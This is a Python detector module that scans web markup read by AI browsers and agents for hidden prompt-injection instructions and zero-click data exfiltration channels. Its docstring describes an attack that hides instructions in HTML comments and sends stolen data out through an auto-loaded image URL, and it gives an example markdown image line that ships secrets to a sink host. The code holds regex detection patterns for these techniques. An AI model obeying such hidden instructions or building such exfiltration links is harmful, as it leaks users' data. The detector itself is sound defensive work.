"""Structural / markup-layer prompt-injection and exfiltration detector.

This is the detector that matters most for AI browsers.  The Zenity Labs
zero-click chain against agentic browsers (August 2026) never showed the victim
a single suspicious word: the instructions lived in an HTML comment and the
stolen data left through the query string of an auto-loaded image.

Techniques covered:

* Instructions inside ``<!-- -->`` comments, ``<script>`` / ``<style>`` blocks.
* CSS-invisible text: ``display:none``, ``visibility:hidden``, ``font-size:0``,
  ``opacity:0``, ``color:#fff`` on white, off-screen absolute positioning.
* ``aria-hidden``/``hidden``/``sr-only`` containers.
* Markdown image / link syntax whose URL interpolates data
  (``![x](https://sink/?q={{secrets}})``) - the classic zero-click exfil.
* ``<img src>`` / ``<link>`` / ``<iframe>`` / ``fetch()`` pointing at an
  external host with a data-bearing query string.
* Anchor text that disagrees with its href (display-vs-destination mismatch).

Because markup is untrusted input, all parsing is regex-based and bounded - no
HTML parser is invoked and no network request is ever made.
"""

from __future__ import annotations

import html
import re
from dataclasses import dataclass
from typing import Dict, List, Optional, Sequence, Tuple

from ...core.types import DetectorKind, EvaluationContext, Finding, Severity
from ...core.utils import truncate
from ..base import Detector
from ..dedupe import noisy_or
from ..indicators import classify_host, is_exfil_sink
from ..normalizer import canonical_text
from ..text_sources import TextSpan, iter_spans
from .patterns import TECHNIQUES

__all__ = ["StructuralInjectionDetector", "StructuralHit"]

# --------------------------------------------------------------------------- #
# Markup patterns
# --------------------------------------------------------------------------- #
HTML_COMMENT_RE = re.compile(r"<!--(.*?)-->", re.DOTALL)
SCRIPT_RE = re.compile(r"<script\b[^>]*>(.*?)</script\s*>", re.IGNORECASE | re.DOTALL)
STYLE_RE = re.compile(r"<style\b[^>]*>(.*?)</style\s*>", re.IGNORECASE | re.DOTALL)
IFRAME_RE = re.compile(r"<iframe\b[^>]*\bsrc\s*=\s*[\"']?([^\"'>\s]+)", re.IGNORECASE)
IMG_TAG_RE = re.compile(r"<img\b[^>]*?\bsrc\s*=\s*[\"']([^\"']+)[\"'][^>]*>", re.IGNORECASE)
LINK_TAG_RE = re.compile(r"<link\b[^>]*?\bhref\s*=\s*[\"']([^\"']+)[\"'][^>]*>", re.IGNORECASE)
ANCHOR_RE = re.compile(r"<a\b[^>]*?\bhref\s*=\s*[\"']([^\"']+)[\"'][^>]*>(.*?)</a\s*>", re.IGNORECASE | re.DOTALL)
MD_IMAGE_RE = re.compile(r"!\[([^\]]{0,120})\]\(\s*([^)\s]+)")
MD_LINK_RE = re.compile(r"(?<!!)\[([^\]]{1,120})\]\(\s*([^)\s]+)")
FETCH_RE = re.compile(r"\b(?:fetch|XMLHttpRequest|navigator\.sendBeacon|axios\.(?:get|post))\s*\(\s*[\"'`]([^\"'`]+)", re.IGNORECASE)

#: Style declarations that render content invisible to a human reader.
INVISIBLE_STYLE_RE = re.compile(
    r"(?:display\s*:\s*none"
    r"|visibility\s*:\s*hidden"
    r"|opacity\s*:\s*0(?:\.0+)?\b"
    r"|font-size\s*:\s*0(?:\.\d+)?(?:px|pt|em|rem)?\b"
    r"|height\s*:\s*0(?:px)?\s*;\s*overflow\s*:\s*hidden"
    r"|(?:left|top)\s*:\s*-\d{4,}(?:px|em)"
    r"|text-indent\s*:\s*-\d{4,}(?:px|em)"
    r"|clip\s*:\s*rect\(0(?:px)?\s*,?\s*0)",
    re.IGNORECASE,
)

#: An element carrying an invisibility style, capturing its inner text.
HIDDEN_ELEMENT_RE = re.compile(
    r"<(\w+)\b[^>]*?(?:style\s*=\s*[\"'][^\"']*(?:display\s*:\s*none|visibility\s*:\s*hidden|"
    r"opacity\s*:\s*0|font-size\s*:\s*0)[^\"']*[\"']|\bhidden\b|aria-hidden\s*=\s*[\"']true[\"']|"
    r"class\s*=\s*[\"'][^\"']*(?:sr-only|visually-hidden|screen-reader)[^\"']*[\"'])[^>]*>(.*?)</\1\s*>",
    re.IGNORECASE | re.DOTALL,
)

#: White (or near-white) foreground colour - hidden on a white background.
WHITE_TEXT_RE = re.compile(
    r"color\s*:\s*(?:#(?:fff(?:fff)?|FFF(?:FFF)?)\b|white\b|rgba?\(\s*25[0-5]\s*,\s*25[0-5]\s*,\s*25[0-5])",
    re.IGNORECASE,
)

#: Template interpolation inside a URL - the tell-tale of data-bearing exfil.
URL_INTERPOLATION_RE = re.compile(
    r"(?:\{\{[^}]{1,80}\}\}|\$\{[^}]{1,80}\}|%\([^)]{1,60}\)s|<[A-Za-z_][\w ]{0,40}>|\{[a-z_][\w]{2,40}\})"
)

#: Query keys that carry payloads out.
EXFIL_PARAM_RE = re.compile(
    r"(?i)[?&](?:q|d|data|payload|body|content|text|msg|message|info|dump|leak|"
    r"secret|token|key|cred|session|cookie|mail|to|log|note|c|s|x)=",
)

#: Long opaque value in a query string (base64-ish blob being shipped out).
LONG_QUERY_VALUE_RE = re.compile(r"[?&][\w.\-\[\]]{1,32}=([A-Za-z0-9%+/=_-]{80,})")

_TAG_STRIP_RE = re.compile(r"<[^>]+>")
_WS_RE = re.compile(r"\s+")


@dataclass
class StructuralHit:
    """One structural anomaly.

    Attributes:
        technique: Short technique id used as a tag.
        label: Chinese explanation.
        severity: Severity contributed.
        weight: Confidence contribution for noisy-OR aggregation.
        evidence: Evidence lines.
    """

    technique: str
    label: str
    severity: Severity
    weight: float
    evidence: List[str]


def _visible_text(fragment: str) -> str:
    """Strip tags/entities and collapse whitespace."""
    return _WS_RE.sub(" ", html.unescape(_TAG_STRIP_RE.sub(" ", fragment or ""))).strip()


def _carries_instruction(text: str) -> Optional[str]:
    """Return the name of the injection technique found in ``text``, if any."""
    surface = canonical_text(text)
    for technique in TECHNIQUES:
        if technique.matches(surface):
            return technique.name
    return None


class StructuralInjectionDetector(Detector):
    """Finds instructions and exfiltration channels hidden in markup."""

    name = "prompt_injection.structural"
    kind = DetectorKind.PROMPT_INJECTION
    default_severity = Severity.HIGH
    references = (
        "https://genai.owasp.org/llmrisk/llm01-prompt-injection/",
        "https://embracethered.com/blog/posts/2023/markdown-image-data-exfiltration/",
    )

    def __init__(
        self,
        *,
        enabled: bool = True,
        min_confidence: float = 0.3,
        allowlist: Optional[Sequence[str]] = None,
        **options: object,
    ) -> None:
        """Args:
        enabled: Registry enable flag.
        min_confidence: Drop findings below this confidence.
        allowlist: Hosts considered safe destinations for images/links.
        """
        super().__init__(enabled=enabled, **options)
        self.min_confidence = float(min_confidence)
        self.allowlist = [h.lower() for h in (allowlist or [])]

    def analyze(self, ctx: EvaluationContext) -> List[Finding]:
        """Scan every span that could contain markup."""
        findings: List[Finding] = []
        for span in iter_spans(ctx, min_length=12):
            findings.extend(self._analyse_span(span))
        return findings

    def analyze_text(self, text: str, location: str = "text") -> List[Finding]:
        """Scan a bare markup string."""
        return self._analyse_span(TextSpan(text=text or "", location=location))

    # ------------------------------------------------------------------ #
    # Internals
    # ------------------------------------------------------------------ #
    def _analyse_span(self, span: TextSpan) -> List[Finding]:
        """Run all structural probes over one span."""
        text = span.text
        if not text:
            return []
        hits: List[StructuralHit] = []
        hits.extend(self._check_hidden_containers(text))
        hits.extend(self._check_comments_and_scripts(text))
        hits.extend(self._check_data_bearing_urls(text))
        hits.extend(self._check_link_mismatch(text))
        if not hits:
            return []

        confidence = noisy_or([hit.weight for hit in hits]) * span.weight
        if confidence < self.min_confidence:
            return []
        order = {Severity.INFO: 0, Severity.LOW: 1, Severity.MEDIUM: 2, Severity.HIGH: 3, Severity.CRITICAL: 4}
        severity = max((hit.severity for hit in hits), key=lambda s: order[s])
        techniques = sorted({hit.technique for hit in hits})
        evidence: List[str] = []
        for hit in hits:
            evidence.extend(hit.evidence)
        return [
            self.make_finding(
                title=f"结构化注入 / 隐蔽外带：{'/'.join(techniques[:3])}",
                description="; ".join(dict.fromkeys(hit.label for hit in hits)),
                severity=severity,
                confidence=confidence,
                evidence=evidence,
                location=span.location,
                remediation="渲染前剥离注释、脚本与不可见元素；禁止自动加载外域图片与 iframe",
                tags=["prompt-injection", "structural", *techniques],
            )
        ]

    # -- probes --------------------------------------------------------- #
    def _check_hidden_containers(self, text: str) -> List[StructuralHit]:
        """Text hidden with CSS, ``hidden`` or ``aria-hidden``."""
        out: List[StructuralHit] = []
        for match in HIDDEN_ELEMENT_RE.finditer(text):
            inner = _visible_text(match.group(2))
            if len(inner) < 12:
                continue
            technique = _carries_instruction(inner)
            weight = 0.85 if technique else 0.45
            severity = Severity.CRITICAL if technique else Severity.MEDIUM
            evidence = [f"[hidden_element] <{match.group(1)}> 内隐藏文本: {truncate(inner, 200)}"]
            if technique:
                evidence.append(f"[hidden_element] 隐藏文本命中注入技法: {technique}")
            out.append(StructuralHit("hidden_element", "不可见元素中夹带指令（display:none / aria-hidden / sr-only）",
                                     severity, weight, evidence))
            if len(out) >= 3:
                break
        if not out and INVISIBLE_STYLE_RE.search(text) and len(text) > 200:
            out.append(StructuralHit(
                "invisible_style",
                "内容包含隐藏样式声明，可能存在人眼不可见的指令块",
                Severity.LOW, 0.25,
                [f"[invisible_style] {truncate(INVISIBLE_STYLE_RE.search(text).group(0), 120)}"],
            ))
        if WHITE_TEXT_RE.search(text):
            out.append(StructuralHit(
                "white_text",
                "白底白字：使用与背景同色的前景色隐藏文本",
                Severity.MEDIUM, 0.4,
                [f"[white_text] {truncate(WHITE_TEXT_RE.search(text).group(0), 120)}"],
            ))
        return out

    def _check_comments_and_scripts(self, text: str) -> List[StructuralHit]:
        """Instructions parked in comments, scripts or style blocks."""
        out: List[StructuralHit] = []
        for pattern, technique, label, base_weight in (
            (HTML_COMMENT_RE, "html_comment", "HTML 注释中夹带指令", 0.5),
            (SCRIPT_RE, "script_block", "残留 <script> 块，内容会被 Agent 读入上下文", 0.4),
            (STYLE_RE, "style_block", "残留 <style> 块内含可疑文本", 0.3),
        ):
            for match in pattern.finditer(text):
                inner = _visible_text(match.group(1))
                if len(inner) < 12:
                    continue
                found = _carries_instruction(inner)
                weight = 0.9 if found else base_weight
                severity = Severity.CRITICAL if found else Severity.MEDIUM
                evidence = [f"[{technique}] {truncate(inner, 200)}"]
                if found:
                    evidence.append(f"[{technique}] 命中注入技法: {found}")
                out.append(StructuralHit(technique, label, severity, weight, evidence))
                break  # one hit per markup kind is enough
        for match in IFRAME_RE.finditer(text):
            url = match.group(1)
            info = classify_host(url)
            if info["host"] and not self._allowed(str(info["host"])):
                out.append(StructuralHit(
                    "iframe",
                    "内容中嵌入外域 iframe，可作为二次注入或跟踪通道",
                    Severity.MEDIUM, 0.35,
                    [f"[iframe] src={truncate(url, 160)}"],
                ))
                break
        return out

    def _check_data_bearing_urls(self, text: str) -> List[StructuralHit]:
        """Markdown/HTML image and fetch URLs that carry data outward."""
        out: List[StructuralHit] = []
        candidates: List[Tuple[str, str, str]] = []
        for match in MD_IMAGE_RE.finditer(text):
            candidates.append(("markdown_image", match.group(2), match.group(1)))
        for match in IMG_TAG_RE.finditer(text):
            candidates.append(("img_tag", match.group(1), ""))
        for match in LINK_TAG_RE.finditer(text):
            candidates.append(("link_tag", match.group(1), ""))
        for match in FETCH_RE.finditer(text):
            candidates.append(("script_fetch", match.group(1), ""))

        for technique, url, alt in candidates[:12]:
            url = html.unescape(url)
            info = classify_host(url)
            host = str(info["host"] or "")
            if not host or self._allowed(host):
                continue
            reasons: List[str] = []
            weight, severity = 0.3, Severity.LOW
            if URL_INTERPOLATION_RE.search(url):
                reasons.append("URL 中存在模板插值占位符（数据将被拼接外带）")
                weight, severity = 0.85, Severity.CRITICAL
            if EXFIL_PARAM_RE.search(url):
                reasons.append("查询参数名指向数据承载字段")
                weight, severity = max(weight, 0.6), max(severity, Severity.HIGH, key=lambda s: s.score)
            long_value = LONG_QUERY_VALUE_RE.search(url)
            if long_value:
                reasons.append(f"查询串携带 {len(long_value.group(1))} 字符的不透明载荷")
                weight, severity = max(weight, 0.7), max(severity, Severity.HIGH, key=lambda s: s.score)
            sink = is_exfil_sink(host)
            if sink:
                reasons.append(f"目标主机属于 {sink[0]} 类外带服务 ({sink[1]})")
                weight, severity = 0.9, Severity.CRITICAL
            if technique == "script_fetch":
                reasons.append("脚本内直接发起外域请求")
                weight = max(weight, 0.5)
            if not reasons:
                continue
            evidence = [f"[{technique}] url={truncate(url, 180)}"]
            if alt:
                evidence.append(f"[{technique}] alt={truncate(alt, 80)}")
            evidence.extend(f"[{technique}] {reason}" for reason in reasons)
            out.append(StructuralHit(
                technique,
                "Markdown/HTML 资源 URL 外带数据（零点击外泄通道）",
                severity, weight, evidence,
            ))
            if len(out) >= 4:
                break
        return out

    def _check_link_mismatch(self, text: str) -> List[StructuralHit]:
        """Anchor text claiming one destination while href points elsewhere."""
        out: List[StructuralHit] = []
        pairs: List[Tuple[str, str]] = [
            (_visible_text(m.group(2)), m.group(1)) for m in ANCHOR_RE.finditer(text)
        ]
        pairs.extend((m.group(1), m.group(2)) for m in MD_LINK_RE.finditer(text))
        for label, href in pairs[:12]:
            label_info = classify_host(label)
            href_info = classify_host(href)
            label_host = str(label_info["host"] or "")
            href_host = str(href_info["host"] or "")
            if not label_host or not href_host:
                continue
            if label_host == href_host or label_info["registrable"] == href_info["registrable"]:
                continue
            out.append(StructuralHit(
                "link_mismatch",
                "超链接显示文本与实际目标域不一致（钓鱼/重定向诱导）",
                Severity.HIGH, 0.6,
                [f"[link_mismatch] 显示 {truncate(label, 80)} -> 实际 {truncate(href, 140)}"],
            ))
            if len(out) >= 2:
                break
        return out

    def _allowed(self, host: str) -> bool:
        """True when ``host`` is on the configured allowlist."""
        host = host.lower()
        return any(host == entry or host.endswith("." + entry) for entry in self.allowlist)

    # ------------------------------------------------------------------ #
    # Reusable helper for other detectors / the CLI
    # ------------------------------------------------------------------ #
    @staticmethod
    def extract_hidden_markup_text(text: str) -> Dict[str, List[str]]:
        """Return all text that a human reader would never see.

        Keys: ``comments``, ``scripts``, ``hidden_elements``.  Used by the
        red-team harness to assert that a payload really is invisible.
        """
        return {
            "comments": [_visible_text(m.group(1)) for m in HTML_COMMENT_RE.finditer(text or "")][:10],
            "scripts": [_visible_text(m.group(1)) for m in SCRIPT_RE.finditer(text or "")][:10],
            "hidden_elements": [_visible_text(m.group(2)) for m in HIDDEN_ELEMENT_RE.finditer(text or "")][:10],
        }
